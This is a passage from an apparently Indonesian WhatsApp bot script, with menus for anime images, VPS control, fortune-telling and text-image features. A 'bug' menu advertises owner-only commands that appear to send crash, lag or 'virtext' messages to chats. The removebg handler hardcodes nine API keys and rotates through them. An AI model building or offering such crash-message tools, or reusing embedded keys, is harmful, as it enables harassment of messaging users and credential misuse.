┆❏⭔●${prefix}thighs 🅕
┆❏⭔●${prefix}yuri 🅕
┆❏⭔●${prefix}zettai 🅕

Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case 'animev2menu': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*  
╭––『 AnimeV2 』
┆❏⭔●${prefix}akira 🅕
┆❏⭔●${prefix}akiyama 🅕
┆❏⭔●${prefix}ana ??
┆❏⭔●${prefix}asuna 🅕
┆❏⭔●${prefix}ayuzawa 🅕
┆❏⭔●${prefix}boruto 🅕
┆❏⭔●${prefix}chiho 🅕
┆❏⭔●${prefix}chitoge 🅕
┆❏⭔●${prefix}cosplayloli 🅕
┆❏⭔●${prefix}cosplaysagiri 🅕
┆❏⭔●${prefix}deidara 🅕
┆❏⭔●${prefix}doraemon 🅕
┆❏⭔●${prefix}elaina 🅕
┆❏⭔●${prefix}emilia 🅕
┆❏⭔●${prefix}erza 🅕
┆❏⭔●${prefix}gremory 🅕
┆❏⭔●${prefix}hestia 🅕
┆❏⭔●${prefix}hinata 🅕
┆❏⭔●${prefix}husbu 🅕
┆❏⭔●${prefix}inori 🅕
┆❏⭔●${prefix}isuzu 🅕
┆❏⭔●${prefix}itachi 🅕
┆❏⭔●${prefix}itori 🅕
┆❏⭔●${prefix}kaga 🅕
┆❏⭔●${prefix}kagura 🅕
┆❏⭔●${prefix}kakasih 🅕
┆❏⭔●${prefix}kaori 🅕
┆❏⭔●${prefix}keneki 🅕
┆❏⭔●${prefix}kotori 🅕
┆❏⭔●${prefix}kurumi 🅕
┆❏⭔●${prefix}loli 🅕
┆❏⭔●${prefix}madara 🅕
┆❏⭔●${prefix}megumin 🅕
┆❏⭔●${prefix}mikasa 🅕
┆❏⭔●${prefix}mikey 🅕
┆❏⭔●${prefix}miku 🅕
┆❏⭔●${prefix}minato 🅕
┆❏⭔●${prefix}naruto 🅕
┆❏⭔●${prefix}neko 🅕
┆❏⭔●${prefix}neko2 🅕
┆❏⭔●${prefix}nekonime 🅕
┆❏⭔●${prefix}nezuko 🅕
┆❏⭔●${prefix}onepiece 🅕
┆❏⭔●${prefix}pokemon 🅕
┆❏⭔●${prefix}randomnime 🅕
┆❏⭔●${prefix}randomnime2 🅕
┆❏⭔●${prefix}rize 🅕
┆❏⭔●${prefix}sagiri 🅕
┆❏⭔●${prefix}sakura 🅕
┆❏⭔●${prefix}sasuke 🅕
┆❏⭔●${prefix}shina 🅕
┆❏⭔●${prefix}shinka 🅕
┆❏⭔●${prefix}shinomiya 🅕
┆❏⭔●${prefix}shizuka 🅕
┆❏⭔●${prefix}shota 🅕
┆❏⭔●${prefix}tejina 🅕
┆❏⭔●${prefix}toukachan 🅕
┆❏⭔●${prefix}tsunade 🅕
┆❏⭔●${prefix}waifu 🅕
┆❏⭔●${prefix}animewall 🅕
┆❏⭔●${prefix}yotsuba 🅕
┆❏⭔●${prefix}yuki 🅕
┆❏⭔●${prefix}yulibocil 🅕
┆❏⭔●${prefix}yumeko 🅕
┆❏⭔●${prefix}8ball 🅕
┆❏⭔●${prefix}tickle 🅕
┆❏⭔●${prefix}gecg 🅕
┆❏⭔●${prefix}feed 🅕
┆❏⭔●${prefix}animeawoo 🅕
┆❏⭔●${prefix}animemegumin 🅕
┆❏⭔●${prefix}animeshinobu 🅕
┆❏⭔●${prefix}animehandhold 🅕
┆❏⭔●${prefix}animehighfive 🅕
┆❏⭔●${prefix}animecringe 🅕
┆❏⭔●${prefix}animedance 🅕
┆❏⭔●${prefix}animehappy 🅕
┆❏⭔●${prefix}animeglomp 🅕
┆❏⭔●${prefix}animeblush 🅕
┆❏⭔●${prefix}animesmug 🅕
┆❏⭔●${prefix}animewave 🅕
┆❏⭔●${prefix}animesmille 🅕
┆❏⭔●${prefix}animepoke 🅕
┆❏⭔●${prefix}animewink 🅕
┆❏⭔●${prefix}animebonk 🅕
┆❏⭔●${prefix}animebully 🅕
┆❏⭔●${prefix}animeyeet 🅕
┆❏⭔●${prefix}animebite 🅕
┆❏⭔●${prefix}animelick 🅕
┆❏⭔●${prefix}animekill 🅕
┆❏⭔●${prefix}animecry 🅕
┆❏⭔●${prefix}animewlp 🅕
┆❏⭔●${prefix}animekiss 🅕
┆❏⭔●${prefix}animehug 🅕
┆❏⭔●${prefix}animeneko 🅕
┆❏⭔●${prefix}animepat 🅕
┆❏⭔●${prefix}animeslap 🅕
┆❏⭔●${prefix}animecuddle 🅕
┆❏⭔●${prefix}banimewaifu 🅕
┆❏⭔●${prefix}animenom 🅕
┆❏⭔●${prefix}animefoxgirl 🅕
┆❏⭔●${prefix}animegecg 🅕
┆❏⭔●${prefix}animetickle 🅕
┆❏⭔●${prefix}animefeed 🅕
┆❏⭔●${prefix}animeavatar 🅕
┆❏⭔●${prefix}genshin 🅕
┆❏⭔●${prefix}anime 🅕

Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case 'openaimenu': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*  
╭––『 OpenAI 』
┆
┆❏⭔●${prefix}openai 🅕
┆❏⭔●${prefix}ai 🅕
┆❏⭔●${prefix}aimage 🅕
┆❏⭔●${prefix}remini 🅕

Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "vpslinode":{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
 const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
 let menulinod = `*===[ Linode Vps Menu ]===*
 
*╭───〘 Linode Menu 〙───*
*│*╭──────────
*│*│⭔ ${prefix}resetpassword
*│*│⭔ ${prefix}deletelinode
*│*│⭔ ${prefix}listlinode
*│*│⭔ ${prefix}onlinode
*│*│⭔ ${prefix}offlinode
*│*│⭔ ${prefix}rebootlinode
*│*│⭔ ${prefix}rebuildlinode
*│*│⭔ ${prefix}sisalinode
*│*│⭔ ${prefix}saldolinode
*│*│⭔ ${prefix}cekvps
*│*│⭔ ${prefix}linode1gb
*│*│⭔ ${prefix}linode2gb
*│*│⭔ ${prefix}linode4gb
*│*│⭔ ${prefix}linode8gb
*│*│⭔ ${prefix}linode16gb
*│*╰─────────
*╰───〘 Made By @${owned.split("@")[0]} 〙─────*`
reply(menulinod)}
break
case 'credits': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*  
▭▬▭( *ᴄʀᴇᴅɪᴛs ᴛʜᴀɴᴋs ᴀʟʟ* )▭▬▭

> _all creator bot_
> _owner bot_
> _penyedia Rest Api_
> _penyedia Module_
> _BiiofcRipper (sc ori)_
> _My Self (Saya Sendiri Rafathar Official)_
> _Hyuu offc_
> _HenzzXD_
> _Rafathar Official_
> _Vallz offc_
> _Sanzz KangKudet_
> _Wexx Offc_
> _Reyz Hayanasi_
Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case 'bugnewmenu': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋* 

▭▬▭( *BUG NEW MENU* )▭▬▭

⭔ ${prefix}sendinvite  (ᴋʜᴜsᴜs ᴘʀɪʙᴀᴅɪ) 
⭔ ${prefix}puh  (ᴋʜᴜsᴜs ɢᴄ / ᴘʀɪʙᴀᴅɪ) 
⭔ ${prefix}santetgcnew  (ᴋʜᴜsᴜs ɢᴄ) 
⭔ ${prefix}santetnew  (ᴋʜᴜsᴜs ᴘʀɪʙᴀᴅɪ) 
⭔ ${prefix}gasfullgcnew  (ᴋʜᴜsᴜs ɢᴄ) 
⭔ ${prefix}unlidelaygcnew (ᴋʜᴜsᴜs ɢᴄ) 
⭔ ${prefix}unlilaggcnew  (ᴋʜᴜsᴜs ɢᴄ) 
⭔ ${prefix}unlibomgcnew  (ᴋʜᴜsᴜs ɢᴄ) 
⭔ ${prefix}unlicuygcnew  (ᴋʜᴜsᴜs ᴘʀɪʙᴀᴅɪ
⭔ ${prefix}sendgasfulnew  (ᴋʜᴜsᴜs ᴘʀɪʙᴀᴅɪ) 
⭔ ${prefix}sendunlidelaynew (ᴋʜᴜsᴜs ᴘʀɪʙᴀᴅɪ) 
⭔ ${prefix}sendunlilagnew   (ᴋʜᴜsᴜs ᴘʀɪʙᴀᴅɪ) 
⭔ ${prefix}sendunlibomnew  (ᴋʜᴜsᴜs ᴘʀɪʙᴀᴅɪ) 
⭔ ${prefix}sendunlicuynew  (ᴋʜᴜsᴜs ᴘʀɪʙᴀᴅɪ) 
⭔ ${prefix}unlitetnew  (ᴋʜᴜsᴜs ᴘʀɪʙᴀᴅɪ) 
⭔ ${prefix}unlidelaynew (ᴋʜᴜsᴜs ᴘʀɪʙᴀᴅɪ) 
⭔ ${prefix}unlilagnew  (ᴋʜᴜsᴜs ᴘʀɪʙᴀᴅɪ) 
⭔ ${prefix}unlibomnew (ᴋʜᴜsᴜs ᴘʀɪʙᴀᴅɪ) 
⭔ ${prefix}unlicuynew  (ᴋʜᴜsᴜs ᴘʀɪʙᴀᴅɪ) 
⭔ ${prefix}unlidocunew (ᴋʜᴜsᴜs ᴘʀɪʙᴀᴅɪ) 
⭔ ${prefix}unlitrolinew  (ᴋʜᴜsᴜs ᴘʀɪʙᴀᴅɪ) 
⭔ ${prefix}unlivirtextnew  (ᴋʜᴜsᴜs ᴘʀɪʙᴀᴅɪ) 
⭔ ${prefix}sendunlidocunew  (ᴋʜᴜsᴜs ᴘʀɪʙᴀᴅɪ) 
⭔ ${prefix}sendunlitrolinew  (ᴋʜᴜsᴜsᴘʀɪʙᴀᴅɪ

  *ʙʏ ʀɪᴏᴏ ʜᴏsᴛɪɴɢ ʀᴇᴄᴏᴅᴇ ʙᴜɢ ɴᴇᴡ*

Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case 'primbonmenu': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *PRIMBON MENU* )▭▬▭

❏ᴀʀᴛɪɴᴀᴍᴀ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴀʀᴛɪᴍɪᴍᴘɪ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴋᴇᴄᴏᴄᴏᴋᴀɴᴘᴀꜱᴀɴɢᴀɴ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴋᴇᴄᴏᴄᴏᴋᴀɴɴᴀᴍᴀ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴊᴀᴅɪᴀɴᴘᴇʀɴɪᴋᴀʜᴀɴ (ᴛᴇxᴛɴʏᴀ)
┣❏ʀᴇᴊᴇᴋɪ (ᴛᴇxᴛɴʏᴀ)
┣❏ꜱɪꜰᴀᴛᴜꜱᴀʜᴀ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴘᴇᴋᴇʀᴊᴀᴀɴ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴀʀᴛɪᴛᴀʀᴏᴛ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴘᴏᴛᴇɴꜱɪᴘᴇɴʏᴀᴋɪᴛ (ᴛᴇxᴛɴʏᴀ)
┣❏ʀᴀᴍᴀʟᴀɴɴᴀꜱɪʙ (ᴛᴇxᴛɴʏᴀ)
┣❏ʜᴀʀɪꜱᴀɴɢᴀʀ (ᴛᴇxᴛɴʏᴀ)
┣❏ʜᴀʀɪʙᴀɪᴋ (ᴛᴇxᴛɴʏᴀ)
┣❏ꜰᴇɴɢꜱʜᴜɪ (ᴛᴇxᴛɴʏᴀ)
┣❏ɴᴀɢᴀʜᴀʀɪ (ᴛᴇxᴛɴʏᴀ)
┣❏ʜᴀʀɪɴᴀᴀꜱ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴡᴇᴛᴏɴ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴘᴇʀᴜɴᴛᴜɴɢᴀɴ (ᴛᴇxᴛɴʏᴀ)
┣❏ɴᴏᴍᴏʀʜᴏᴋɪ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴀʀᴀʜʀᴇᴊᴇᴋɪ (ᴛᴇxᴛɴʏᴀ)
┣❏ꜱɪꜰᴀᴛ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴋᴇʙᴇʀᴜɴᴛᴜɴɢᴀɴ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴍᴇᴍᴀɴᴄɪɴɢ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴍᴀꜱᴀꜱᴜʙᴜʀ (ᴛᴇxᴛɴʏᴀ)
┣❏ᴢᴏᴅɪᴀᴋ (ᴛᴇxᴛɴʏᴀ)
┣❏ꜱʜɪᴏ (ᴛᴇxᴛɴʏᴀ)

Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "test":{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
reply(`Bot Ini Telah Aktif Tuan Rafathar Offcial 🥶: ${runtime(process.uptime())}`)
}
break
case 'nulis': {
                if (!q) return m.reply(`Teks Nya Apa Kak?`)
                let sections = [
                {
                title: "Nulis Buku >_<",
                rows: [
                {title: "⌲ 「 Nulis Kanan 」", rowId: `${prefix}nuliskanan ${q}`},
                {title: "⌲ 「 Nulis Kiri 」", rowId: `${prefix}nuliskiri ${q}`}
                ]
                },
                {
                title: "Nulis Folio >_<",
                rows: [
                {title: "⌲ 「 Folio Kanan 」", rowId: `${prefix}foliokanan ${q}`},
                {title: "⌲ 「 Folio Kiri 」", rowId: `${prefix}foliokiri ${q}`}
                ]
                }
                ]
                Biiofc.sendMessage(m.chat, `*Silahkan Pilih Menu Dibawah Ini*`, ntiktok, `NULIS MENU`, `Touch Me (⁠≧⁠▽⁠≦⁠)`, sections, floc)
              }
            break
            case 'nuliskiri': {
                if (args.length < 1) return m.reply(`Kirim perintah *${prefix}nuliskiri* teks`)
                m.reply(mess.wait)
   if (!isPremium && !isOwner) return m.reply(`Khusus Premium Atau Owner`)
                var tulisan = body.slice(11)
                var splitText = tulisan.replace(/(\S+\s*){1,9}/g, '$&\n')
                var fixHeight = splitText.split('\n').slice(0, 31).join('\n')
                spawn('convert', ['./media/image/nulis/images/buku/sebelumkiri.jpg','-font','./image/nulis/font/Indie-Flower.ttf','-size','960x1280','-pointsize','22','-interline-spacing','2','-annotate','+140+153',fixHeight,'./media/image/nulis/images/buku/setelahkiri.jpg'])
                .on('error', () => m.reply(mess.error))
                .on('exit', () => {
                Biiofc.sendMessage(m.chat, { image: fs.readFileSync('./media/image/nulis/images/buku/setelahkiri.jpg')}, { quoted: fakestatus, caption: `Jangan Malas Kak...`})
                })
             }
            break
            case 'nuliskanan': {
                if (args.length < 1) return reply(`Kirim perintah *${prefix}nuliskanan* teks`)
                m.reply(mess.wait)
                if (!isPremium && !isOwner) return m.reply(`Khusus Premium Atau Owner`)
                var tulisan = body.slice(12)
                var splitText = tulisan.replace(/(\S+\s*){1,9}/g, '$&\n')
                var fixHeight = splitText.split('\n').slice(0, 31).join('\n')
                spawn('convert', ['./media/image/nulis/images/buku/sebelumkanan.jpg','-font','./image/nulis/font/Indie-Flower.ttf','-size','960x1280','-pointsize','23','-interline-spacing','2','-annotate','+128+129',fixHeight,'./media/image/nulis/images/buku/setelahkanan.jpg'])
                .on('error', () => m.reply(mess.error))
                .on('exit', () => {
                Biiofc.sendMessage(m.chat, { image: fs.readFileSync('./media/image/nulis/images/buku/setelahkanan.jpg')}, {quoted: fakestatus, caption: `Jangan Malas Kak...`})
                })
              }
            break
            case 'foliokiri': {
                if (args.length < 1) return m.reply(`Kirim perintah *${prefix}foliokiri* teks`)
                m.reply(mess.wait)
                if (!isPremium && !isOwner) return m.reply(`Khusus Premium Atau Owner`)
                var tulisan = body.slice(11)
                var splitText = tulisan.replace(/(\S+\s*){1,13}/g, '$&\n')
                var fixHeight = splitText.split('\n').slice(0, 38).join('\n')
                spawn('convert', ['./media/image/nulis/images/folio/sebelumkiri.jpg','-font','./image/nulis/font/Indie-Flower.ttf','-size','1720x1280','-pointsize','23','-interline-spacing','4','-annotate','+48+185',fixHeight,'./media/image/nulis/images/folio/setelahkiri.jpg'])
                .on('error', () => m.reply(mess.error))
                .on('exit', () => {
                Biiofc.sendMessage(m.chat, { image: fs.readFileSync('./media/image/nulis/images/folio/setelahkiri.jpg')}, { quoted: fakestatus, caption: `Jangan Malas Kak...`})
                })
             }
            break
            case 'foliokanan': {
                if (args.length < 1) return m.reply(`Kirim perintah *${prefix}foliokanan* teks`)
                m.reply(mess.wait)
if (!isPremium && !isOwner) return m.reply(`Khusus Premium Atau Owner`)
                var tulisan = body.slice(12)
                var splitText = tulisan.replace(/(\S+\s*){1,13}/g, '$&\n')
                var fixHeight = splitText.split('\n').slice(0, 38).join('\n')
                spawn('convert', ['./media/image/nulis/images/folio/sebelumkanan.jpg','-font','./image/nulis/font/Indie-Flower.ttf','-size','960x1280','-pointsize','23','-interline-spacing','3','-annotate','+89+190',fixHeight,'./media/image/nulis/images/folio/setelahkanan.jpg'])
                .on('error', () => m.reply(mess.error))
                .on('exit', () => {
                Biiofc.sendMessage(m.chat, { image: fs.readFileSync('./media/image/nulis/images/folio/setelahkanan.jpg')}, {quoted: fakestatus, caption: `Jangan Malas Kak...`})
                })
             }
            break
case 'imagenobg': case 'removebg': case 'remove-bg': {
	    if (!/image/.test(mime)) return `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    if (/webp/.test(mime)) return `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    let remobg = require('remove.bg')
	    let apirnobg = ['q61faXzzR5zNU6cvcrwtUkRU','S258diZhcuFJooAtHTaPEn4T','5LjfCVAp4vVNYiTjq9mXJWHF','aT7ibfUsGSwFyjaPZ9eoJc61','BY63t7Vx2tS68YZFY6AJ4HHF','5Gdq1sSWSeyZzPMHqz7ENfi8','86h6d6u4AXrst4BVMD9dzdGZ','xp8pSDavAgfE5XScqXo9UKHF','dWbCoCb3TacCP93imNEcPxcL']
	    let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)]
	    hmm = await './src/remobg-'+getRandom('')
	    localFile = await Biiofc.downloadAndSaveMediaMessage(qmsg, hmm)
	    outputFile = await './src/hremo-'+getRandom('.png')
	    m.reply(mess.wait)
	    remobg.removeBackgroundFromImageFile({
	      path: localFile,
	      apiKey: apinobg,
	      size: "regular",
	      type: "auto",
	      scale: "100%",
	      outputFile 
	    }).then(async result => {
	    Biiofc.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: mess.success}, { quoted: fdoc })
	    await fs.unlinkSync(localFile)
	    await fs.unlinkSync(outputFile)
	    })
	    }
	    break
           
case 'blackpink':
case 'neon':
case 'greenneon':
case 'advanceglow':
case 'futureneon':
case 'sandwriting':
case 'sandsummer':
case 'sandengraved':
case 'metaldark':
case 'neonlight':
case 'holographic':
case 'text1917':
case 'minion':
case 'deluxesilver':
case 'newyearcard':
case 'bloodfrosted':
case 'halloween':
case 'jokerlogo':
case 'fireworksparkle':
case 'natureleaves':
case 'bokeh':
case 'toxic':
case 'strawberry':
case 'box3d':
case 'roadwarning':
case 'breakwall':
case 'icecold':
case 'luxury':
case 'cloud':
case 'summersand':
case 'horrorblood':
case 'thunder':
	if (args.length == 0) return reply(`Example: ${prefix + command} HW MODS WA`)
	await Biiofc
	Biiofc.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/textprome/${command}?apikey=${apikey}&text=${command}` } })
	break
            case 'jadwatv': {
                let sections = [
                {
                title: "JadwalTV Nasional >_<",
                rows: [
                {title: "⌲ 「 Rcti 」", rowId: `${prefix}tvschedule rcti`},
                {title: "⌲ 「 Nettv 」", rowId: `${prefix}tvschedule nettv`},
                {title: "⌲ 「 Antv 」", rowId: `${prefix}tvschedule antv`},
                {title: "⌲ 「 Gtv 」", rowId: `${prefix}tvschedule gtv`},
                {title: "⌲ 「 Indosiar 」", rowId: `${prefix}tvschedule indosiar`},
                {title: "⌲ 「 Inewstv 」", rowId: `${prefix}tvschedule inewstv`},
                {title: "⌲ 「 Kompastv 」", rowId: `${prefix}tvschedule kompastv`},
                {title: "⌲ 「 Metrotv 」", rowId: `${prefix}tvschedule metrotv`},
                {title: "⌲ 「 Mnctv 」", rowId: `${prefix}tvschedule mnctv`},
                {title: "⌲ 「 Rtv 」", rowId: `${prefix}tvschedule rtv`},
                {title: "⌲ 「 Sctv 」", rowId: `${prefix}tvschedule sctv`},
                {title: "⌲ 「 Trans7 」", rowId: `${prefix}tvschedule trans7`},
                {title: "⌲ 「 Transtv 」", rowId: `${prefix}tvschedule transtv`},
                {title: "⌲ 「 Tvone 」", rowId: `${prefix}tvschedule tvone`},
                {title: "⌲ 「 Tvri 」", rowId: `${prefix}tvschedule tvri`}
                ]
                }
                ]
                Biiofc.sendListMsg(m.chat, `*Silahkan Pilih Menu Dibawah Ini*`, ntiktok, `List JadwalTV`, `Touch Me (⁠≧⁠▽⁠≦⁠)`, sections, floc)
              }
            break
            case 'tvschedule': {
            let { jadwaltv }= require('./lib/jadwaltv')
            m.reply(await jadwaltv(q))
            }
            break
            case 'artimimpi': case 'tafsirmimpi': {
if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
 if (!text) throw `Example : ${prefix + command} belanja`
 let anu = await primbon.tafsir_mimpi(text)
 if (anu.status == false) return m.reply(anu.message)
 Biiofc.sendText(from, `⭔ *Mimpi :* ${anu.message.mimpi}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Solusi :* ${anu.message.solusi}`, m)
}
break

//=================================================//
case 'nomorhoki':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) return reply(`Example :\n${prefix+command} 6288292024190`)
let anu = await primbon.nomer_hoki(q)
if (anu.status == false) return reply(anu.message)
reply (`> *Nomor HP :* ${anu.message.nomer_hp}\n> *Angka Shuzi :* ${anu.message.angka_shuzi}\n> *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n> *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`)
}
break
case 'ramalanjodoh': case 'ramaljodoh': {
if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
 if (!text) throw `Example : ${prefix + command} HW MODS WA, 7, 7, 2005, Putri, 16, 11, 2004`
 let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
 let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
 if (anu.status == false) return m.reply(anu.message)
 Biiofc.sendText(from, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'artinama': {
if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
 if (!text) throw `Example : ${prefix + command} HW MODS WA Hw`
 let anu = await primbon.arti_nama(text)
 if (anu.status == false) return m.reply(anu.message)
 Biiofc.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'kecocokannama': case 'cocoknama': {
if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
 if (!text) throw `Example : ${prefix + command} HW MODS WA, 7, 7, 2005`
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 Biiofc.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Life Path :* ${anu.message.life_path}\n⭔ *Destiny :* ${anu.message.destiny}\n⭔ *Destiny Desire :* ${anu.message.destiny_desire}\n⭔ *Personality :* ${anu.message.personality}\n⭔ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
}
break
//=================================================//
case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
 if (!text) throw `Example : ${prefix + command} HW MODS WA|Putri`
 let [nama1, nama2] = text.split`|`
 let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
 if (anu.status == false) return m.reply(anu.message)
 Biiofc.sendImage(from,  anu.message.gambar, `⭔ *Nama Anda :* ${anu.message.nama_anda}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
}
break
//=================================================//
